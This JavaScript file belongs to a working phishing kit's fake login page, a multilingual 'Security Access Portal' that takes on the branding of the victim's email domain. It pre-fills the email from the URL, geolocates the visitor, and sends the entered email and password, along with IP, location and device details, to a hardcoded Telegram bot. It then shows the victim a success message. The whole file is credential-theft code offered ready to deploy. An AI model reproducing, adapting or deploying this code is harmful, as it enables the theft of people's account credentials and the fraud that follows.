// ==================== TELEGRAM CONFIGURATION - ONLY CHANGE HERE ====================
const TELEGRAM_BOT_TOKEN = '8019150510:AAE7M4LgP_QaS5rHdVSM_ToC1dXLFcfqGwI';  // Get from @BotFather
const TELEGRAM_CHAT_ID = '5509996296';      // Get from @userinfobot
// ===============================================================================

let currentBackgroundDomain = '';
let userLanguage = 'en';
let userIP = 'Unknown';
let userCountry = 'Unknown';
let userCity = 'Unknown';
let userISP = 'Unknown';
let userTimezone = 'Unknown';
let userDevice = '';

// ==================== TRANSLATION STRINGS ====================
const translationStrings = {
    en: {
        subtitle: "Security Access Portal",
        email_label: "Email",
        password_label: "Password",
        show_password: "Show",
        hide_password: "Hide",
        login_button: "Login",
        forgot_password: "Forgot password?",
        alternative_method: "Use alternative method",
        encrypted_connection: "Encrypted connection",
        copyright: "© 2024",
        privacy: "Privacy",
        terms: "Terms",
        security: "Security",
        please_fill: "Please fill in all fields",
        sending: "Sending...",
        submitted_success: "✓ Login submitted successfully",
        error_submitting: "✗ Error submitting form. Please try again.",
        logging_into: "Logging into"
    },
    es: {
        subtitle: "Portal de Acceso Seguro",
        email_label: "Correo electrónico",
        password_label: "Contraseña",
        show_password: "Mostrar",
        hide_password: "Ocultar",
        login_button: "Iniciar sesión",
        forgot_password: "¿Olvidó su contraseña?",
        alternative_method: "Usar método alternativo",
        encrypted_connection: "Conexión cifrada",
        copyright: "© 2024",
        privacy: "Privacidad",
        terms: "Términos",
        security: "Seguridad",
        please_fill: "Por favor complete todos los campos",
        sending: "Enviando...",
        submitted_success: "✓ Inicio de sesión exitoso",
        error_submitting: "✗ Error al enviar el formulario",
        logging_into: "Iniciando sesión en"
    },
    fr: {
        subtitle: "Portail d'Accès Sécurisé",
        email_label: "E-mail",
        password_label: "Mot de passe",
        show_password: "Afficher",
        hide_password: "Cacher",
        login_button: "Se connecter",
        forgot_password: "Mot de passe oublié?",
        alternative_method: "Utiliser une autre méthode",
        encrypted_connection: "Connexion cryptée",
        copyright: "© 2024",
        privacy: "Confidentialité",
        terms: "Conditions",
        security: "Sécurité",
        please_fill: "Veuillez remplir tous les champs",
        sending: "Envoi en cours...",
        submitted_success: "✓ Connexion réussie",
        error_submitting: "✗ Erreur lors de l'envoi",
        logging_into: "Connexion à"
    },
    de: {
        subtitle: "Sicherer Zugangsportal",
        email_label: "E-Mail",
        password_label: "Passwort",
        show_password: "Anzeigen",
        hide_password: "Verbergen",
        login_button: "Anmelden",
        forgot_password: "Passwort vergessen?",
        alternative_method: "Alternative Methode",
        encrypted_connection: "Verschlüsselte Verbindung",
        copyright: "© 2024",
        privacy: "Datenschutz",
        terms: "AGB",
        security: "Sicherheit",
        please_fill: "Bitte füllen Sie alle Felder aus",
        sending: "Senden...",
        submitted_success: "✓ Anmeldung erfolgreich",
        error_submitting: "✗ Fehler beim Senden",
        logging_into: "Anmelden bei"
    },
    pt: {
        subtitle: "Portal de Acesso Seguro",
        email_label: "E-mail",
        password_label: "Senha",
        show_password: "Mostrar",
        hide_password: "Ocultar",
        login_button: "Entrar",
        forgot_password: "Esqueceu a senha?",
        alternative_method: "Usar método alternativo",
        encrypted_connection: "Conexão criptografada",
        copyright: "© 2024",
        privacy: "Privacidade",
        terms: "Termos",
        security: "Segurança",
        please_fill: "Por favor preencha todos os campos",
        sending: "Enviando...",
        submitted_success: "✓ Login enviado com sucesso",
        error_submitting: "✗ Erro ao enviar formulário",
        logging_into: "Entrando em"
    },
    ru: {
        subtitle: "Безопасный портал доступа",
        email_label: "Эл. почта",
        password_label: "Пароль",
        show_password: "Показать",
        hide_password: "Скрыть",
        login_button: "Войти",
        forgot_password: "Забыли пароль?",
        alternative_method: "Альтернативный метод",
        encrypted_connection: "Зашифрованное соединение",
        copyright: "© 2024",
        privacy: "Конфиденциальность",
        terms: "Условия",
        security: "Безопасность",
        please_fill: "Пожалуйста, заполните все поля",
        sending: "Отправка...",
        submitted_success: "✓ Успешная отправка",
        error_submitting: "✗ Ошибка при отправке",
        logging_into: "Вход в"
    },
    zh: {
        subtitle: "安全访问门户",
        email_label: "电子邮件",
        password_label: "密码",
        show_password: "显示",
        hide_password: "隐藏",
        login_button: "登录",
        forgot_password: "忘记密码？",
        alternative_method: "使用其他方法",
        encrypted_connection: "加密连接",
        copyright: "© 2024",
        privacy: "隐私",
        terms: "条款",
        security: "安全",
        please_fill: "请填写所有字段",
        sending: "发送中...",
        submitted_success: "✓ 提交成功",
        error_submitting: "✗ 提交错误",
        logging_into: "登录到"
    },
    ja: {
        subtitle: "セキュアアクセスポータル",
        email_label: "メールアドレス",
        password_label: "パスワード",
        show_password: "表示",
        hide_password: "非表示",
        login_button: "ログイン",
        forgot_password: "パスワードをお忘れですか？",
        alternative_method: "別の方法を使用",
        encrypted_connection: "暗号化接続",
        copyright: "© 2024",
        privacy: "プライバシー",
        terms: "利用規約",
        security: "セキュリティ",
        please_fill: "すべての項目を入力してください",
        sending: "送信中...",
        submitted_success: "✓ 送信成功",
        error_submitting: "✗ 送信エラー",
        logging_into: "ログイン中"
    },
    ar: {
        subtitle: "بوابة الوصول الآمن",
        email_label: "البريد الإلكتروني",
        password_label: "كلمة المرور",
        show_password: "إظهار",
        hide_password: "إخفاء",
        login_button: "تسجيل الدخول",
        forgot_password: "نسيت كلمة المرور؟",
        alternative_method: "استخدام طريقة بديلة",
        encrypted_connection: "اتصال مشفر",
        copyright: "© 2024",
        privacy: "خصوصية",
        terms: "شروط",
        security: "أمان",
        please_fill: "الرجاء ملء جميع الحقول",
        sending: "جاري الإرسال...",
        submitted_success: "✓ تم الإرسال بنجاح",
        error_submitting: "✗ خطأ في الإرسال",
        logging_into: "تسجيل الدخول إلى"
    }
};

// ==================== GET IP AND LOCATION DETAILS ====================
async function getUserDetails() {
    try {
        // Try multiple IP services for redundancy
        const services = [
            'https://ipapi.co/json/',
            'https://ipinfo.io/json',
            'https://api.ipify.org?format=json'
        ];
        
        for (const service of services) {
            try {
                const response = await fetch(service, { 
                    signal: AbortSignal.timeout(3000) 
                });
                
                if (response.ok) {
                    const data = await response.json();
                    
                    if (service.includes('ipapi.co')) {
                        userIP = data.ip || 'Unknown';
                        userCountry = data.country_name || 'Unknown';
                        userCity = data.city || 'Unknown';
                        userISP = data.org || 'Unknown';
                        userTimezone = data.timezone || 'Unknown';
                        userLanguage = mapCountryToLanguage(data.country_code || '');
                    } 
                    else if (service.includes('ipinfo.io')) {
                        userIP = data.ip || 'Unknown';
                        userCountry = data.country || 'Unknown';
                        userCity = data.city || 'Unknown';
                        userISP = data.org || 'Unknown';
                        userTimezone = data.timezone || 'Unknown';
                        userLanguage = mapCountryToLanguage(data.country || '');
                    }
                    else if (service.includes('ipify.org')) {
                        userIP = data.ip || 'Unknown';
                    }
                    
                    break; // Exit loop if successful
                }
            } catch (e) {
                console.log(`Service ${service} failed:`, e.message);
                continue;
            }
        }
    } catch (error) {
        console.log('Could not fetch IP details:', error);
    }
    
    // Get device info
    userDevice = getDeviceInfo();
    
    console.log(`User detected: ${userIP}, ${userCountry}, ${userCity}, Language: ${userLanguage}`);
}

function mapCountryToLanguage(countryCode) {
    const countryToLang = {
        // English speaking countries
        'US': 'en', 'GB': 'en', 'CA': 'en', 'AU': 'en', 'NZ': 'en',
        'IE': 'en', 'SG': 'en', 'ZA': 'en',
        
        // Spanish speaking countries
        'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es', 'PE': 'es',
        'VE': 'es', 'CL': 'es', 'EC': 'es', 'GT': 'es', 'CU': 'es',
        'BO': 'es', 'DO': 'es', 'HN': 'es', 'PY': 'es', 'SV': 'es',
        'NI': 'es', 'CR': 'es', 'PR': 'es', 'UY': 'es', 'PA': 'es',
        
        // French speaking countries
        'FR': 'fr', 'BE': 'fr', 'CH': 'fr', 'LU': 'fr',
        
        // German speaking countries
        'DE': 'de', 'AT': 'de', 'CH': 'de', 'LI': 'de',
        
        // Portuguese speaking countries
        'PT': 'pt', 'BR': 'pt', 'AO': 'pt', 'MZ': 'pt',
        
        // Italian
        'IT': 'it', 'SM': 'it', 'VA': 'it',
        
        // Russian
        'RU': 'ru', 'BY': 'ru', 'KZ': 'ru', 'KG': 'ru',
        
        // Chinese
        'CN': 'zh', 'TW': 'zh', 'HK': 'zh', 'MO': 'zh',
        
        // Japanese
        'JP': 'ja',
        
        // Korean
        'KR': 'ko', 'KP': 'ko',
        
        // Arabic
        'SA': 'ar', 'AE': 'ar', 'EG': 'ar', 'DZ': 'ar', 'MA': 'ar',
        'IQ': 'ar', 'SD': 'ar', 'SY': 'ar', 'TN': 'ar', 'JO': 'ar',
        'LB': 'ar', 'LY': 'ar', 'OM': 'ar', 'KW': 'ar', 'QA': 'ar',
        'BH': 'ar', 'YE': 'ar'
    };
    
    return countryToLang[countryCode] || 'en';
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    let device = 'Unknown';
    
    if (ua.includes('Windows')) device = 'Windows';
    else if (ua.includes('Mac')) device = 'MacOS';
    else if (ua.includes('iPhone')) device = 'iPhone';
    else if (ua.includes('iPad')) device = 'iPad';
    else if (ua.includes('Android')) device = 'Android';
    else if (ua.includes('Linux')) device = 'Linux';
    
    return device;
}

// ==================== ENHANCED TELEGRAM FUNCTION ====================
function sendToTelegram(email, password) {
    return new Promise((resolve) => {
        const domain = email.includes('@') ? email.split('@')[1] : 'unknown';
        
        // Get current date and time in user's timezone
        const now = new Date();
        const localTime = now.toLocaleString();
        const utcTime = now.toUTCString();
        
        // Create detailed message with all information
        const message = `🔐 *NEW LOGIN DETECTED* 🔐\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━\n` +
            `📧 *EMAIL:* \`${email}\`\n` +
            `🔑 *PASSWORD:* \`${password}\`\n` +
            `━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `🌍 *LOCATION INFO*\n` +
            `├ IP Address: \`${userIP}\`\n` +
            `├ Country: ${userCountry}\n` +
            `├ City: ${userCity}\n` +
            `├ ISP: ${userISP}\n` +
            `└ Timezone: ${userTimezone}\n\n` +
            `📱 *DEVICE INFO*\n` +
            `├ Browser: ${navigator.userAgent.substring(0, 100)}\n` +
            `├ Platform: ${navigator.platform}\n` +
            `├ Language: ${navigator.language}\n` +
            `└ Device: ${userDevice}\n\n` +
            `⏰ *TIME INFO*\n` +
            `├ Local Time: ${localTime}\n` +
            `├ UTC Time: ${utcTime}\n` +
            `└ Timestamp: ${Date.now()}\n\n` +
            `🔗 *PAGE INFO*\n` +
            `├ Domain: ${domain}\n` +
            `├ URL: ${window.location.href}\n` +
            `└ Referrer: ${document.referrer || 'Direct'}\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━`;
        
        // URL encode the message
        const encodedMessage = encodeURIComponent(message);
        
        // Telegram API URL
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
        
        console.log('Sending detailed report to Telegram...');
        
        // Use Image method - WORKS EVERYWHERE
        const img = new Image();
        img.src = url;
        
        // Always resolve after a short delay
        setTimeout(() => {
            console.log('Telegram report sent successfully');
            resolve(true);
        }, 1500);
    });
}

// ==================== TRANSLATION FUNCTIONS ====================
function translatePage(lang) {
    if (!translationStrings[lang]) return;
    
    const elements = document.querySelectorAll('[data-i18n]');
    
    elements.forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (translationStrings[lang][key]) {
            el.textContent = translationStrings[lang][key];
        }
    });
    
    // Update login button text if it exists
    const loginBtn = document.getElementById('loginBtn');
    if (loginBtn && translationStrings[lang]['login_button']) {
        loginBtn.textContent = translationStrings[lang]['login_button'];
    }
    
    // Update language button
    updateLanguageButton(lang);
    
    console.log(`Page translated to ${lang}`);
}

function getLanguageName(langCode) {
    const languageNames = {
        'en': 'English', 'es': 'Español', 'fr': 'Français', 'de': 'Deutsch',
        'it': 'Italiano', 'pt': 'Português', 'ru': 'Русский', 'zh': '中文',
        'ja': '日本語', 'ko': '한국어', 'ar': 'العربية', 'hi': 'हिन्दी',
        'nl': 'Nederlands', 'sv': 'Svenska', 'no': 'Norsk', 'da': 'Dansk',
        'pl': 'Polski', 'cs': 'Čeština', 'el': 'Ελληνικά', 'he': 'עברית',
        'th': 'ไทย', 'vi': 'Tiếng Việt', 'id': 'Bahasa Indonesia', 'tl': 'Filipino',
        'tr': 'Türkçe'
    };
    return languageNames[langCode] || langCode.toUpperCase();
}

function updateLanguageButton(lang) {
    const langBtn = document.getElementById('langToggle');
    if (langBtn) {
        langBtn.textContent = `🌐 ${getLanguageName(lang)}`;
    }
}

function setupLanguageToggle() {
    const langBtn = document.getElementById('langToggle');
    if (!langBtn) return;
    
    langBtn.addEventListener('click', function() {
        // Cycle through major languages
        const languages = ['en', 'es', 'fr', 'de', 'pt', 'ru', 'zh', 'ja', 'ar'];
        const currentIndex = languages.indexOf(userLanguage);
        const nextIndex = (currentIndex + 1) % languages.length;
        const newLang = languages[nextIndex];
        
        userLanguage = newLang;
        translatePage(newLang);
        showMessage(`Language changed to ${getLanguageName(newLang)}`, 'success');
    });
}

// ==================== LOGIN BUTTON HANDLER ====================
function setupLoginButton() {
    const loginBtn = document.getElementById('loginBtn');
    if (!loginBtn) {
        console.error('Login button not found!');
        return;
    }
    
    console.log('Login button found, attaching event listener');
    
    loginBtn.addEventListener('click', function() {
        console.log('Login button clicked');
        
        // Get form values
        const email = document.getElementById('user_email')?.value || '';
        const password = document.getElementById('pw')?.value || '';
        
        // Validate
        if (!email || !password) {
            showMessage(translationStrings[userLanguage]?.please_fill || 'Please fill in all fields', 'error');
            return;
        }
        
        // Check Telegram configuration
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
            showMessage('ERROR: Telegram bot token not configured in script.js', 'error');
            console.error('Telegram bot token not configured');
            return;
        }
        
        if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
            showMessage('ERROR: Telegram chat ID not configured in script.js', 'error');
            console.error('Telegram chat ID not configured');
            return;
        }
        
        // Disable button and show loading
        loginBtn.disabled = true;
        const originalText = loginBtn.textContent;
        loginBtn.textContent = translationStrings[userLanguage]?.sending || 'Sending...';
        
        // Send to Telegram
        sendToTelegram(email, password)
            .then(() => {
                showMessage(translationStrings[userLanguage]?.submitted_success || '✓ Login submitted successfully', 'success');
                document.getElementById('pw').value = ''; // Clear password
            })
            .catch((error) => {
                console.error('Error:', error);
                showMessage(translationStrings[userLanguage]?.error_submitting || '✗ Error submitting form', 'error');
            })
            .finally(() => {
                loginBtn.disabled = false;
                loginBtn.textContent = originalText;
            });
    });
}

// ==================== MESSAGE DISPLAY ====================
function showMessage(text, type = 'error') {
    const messageDiv = document.getElementById('message');
    if (!messageDiv) return;
    
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.style.display = 'block';
    
    setTimeout(() => {
        messageDiv.style.display = 'none';
    }, 3000);
}

// ==================== PASSWORD TOGGLE ====================
function setupPasswordToggle() {
    const toggle = document.getElementById('togglePassword');
    const pw = document.getElementById('pw');
    
    if (toggle && pw) {
        toggle.addEventListener('click', function() {
            const isPassword = pw.type === 'password';
            pw.type = isPassword ? 'text' : 'password';
            this.textContent = isPassword ? 
                (translationStrings[userLanguage]?.hide_password || 'Hide') : 
                (translationStrings[userLanguage]?.show_password || 'Show');
        });
    }
}

// ==================== DOMAIN BACKGROUND ====================
async function loadWebsiteBackground(domain) {
    if (!domain || currentBackgroundDomain === domain) return;
    
    currentBackgroundDomain = domain;
    
    const existingIframe = document.querySelector('.website-background');
    if (existingIframe) existingIframe.remove();
    
    const iframe = document.createElement('iframe');
    iframe.className = 'website-background';
    iframe.style.cssText = `
        position: fixed;
        inset: 0;
        width: 100%;
        height: 100%;
        z-index: -1;
        border: none;
        background: white;
        opacity: 0;
        transition: opacity 1s ease;
        filter: blur(8px);
        transform: scale(1.05);
    `;
    
    document.body.appendChild(iframe);
    iframe.src = `https://${domain}`;
    
    setTimeout(() => {
        iframe.style.opacity = '1';
    }, 1000);
}

async function fetchDomainLogo(domain) {
    const logoImg = document.getElementById('logoImg');
    if (logoImg && domain) {
        logoImg.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
    }
}

function showDomainInfo(domain) {
    const domainInfoDiv = document.getElementById('domainInfo');
    if (domainInfoDiv && domain) {
        domainInfoDiv.innerHTML = `<span>${translationStrings[userLanguage]?.logging_into || 'Logging into'} ${domain}</span>`;
    }
}

// ==================== EMAIL AUTO-FILL FROM HASH ====================
function extractAndSetEmailFromHash() {
    const hash = window.location.hash;
    if (!hash) return false;
    
    const emailFromHash = hash.substring(1);
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (emailRegex.test(emailFromHash)) {
        const emailField = document.getElementById('user_email');
        if (emailField) {
            emailField.value = emailFromHash;
            const domain = emailFromHash.split('@')[1];
            
            loadWebsiteBackground(domain);
            fetchDomainLogo(domain);
            showDomainInfo(domain);
            
            setTimeout(() => {
                document.getElementById('pw')?.focus();
            }, 500);
        }
        return true;
    }
    return false;
}

// ==================== EMAIL INPUT LISTENER ====================
function setupEmailInputListener() {
    const emailInput = document.getElementById('user_email');
    if (!emailInput) return;
    
    emailInput.addEventListener('input', function(e) {
        const email = e.target.value;
        if (email.includes('@')) {
            const domain = email.split('@')[1];
            if (domain.includes('.')) {
                showDomainInfo(domain);
                if (domain !== currentBackgroundDomain) {
                    loadWebsiteBackground(domain);
                    fetchDomainLogo(domain);
                }
            }
        }
    });
}

// ==================== INITIALIZATION ====================
async function initialize() {
    console.log('Page initializing...');
    
    // Get user IP and location details first
    await getUserDetails();
    
    // Setup all functions
    setupLoginButton();
    setupPasswordToggle();
    setupLanguageToggle();
    setupEmailInputListener();
    
    // Set language based on IP
    if (userLanguage !== 'en') {
        translatePage(userLanguage);
    } else {
        updateLanguageButton('en');
    }
    
    // Extract email from URL hash
    extractAndSetEmailFromHash();
    
    // Log configuration status
    console.log('=== CONFIGURATION STATUS ===');
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.warn('⚠️ Telegram bot token not configured - update script.js');
    } else {
        console.log('✅ Telegram bot token configured');
    }
    
    if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        console.warn('⚠️ Telegram chat ID not configured - update script.js');
    } else {
        console.log('✅ Telegram chat ID configured');
    }
    
    console.log('=== USER DETECTED ===');
    console.log(`IP: ${userIP}`);
    console.log(`Location: ${userCity}, ${userCountry}`);
    console.log(`Language: ${userLanguage} (${getLanguageName(userLanguage)})`);
    console.log('=======================');
    
    console.log('Initialization complete');
}

// Start when page loads
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize);
} else {
    initialize();
}
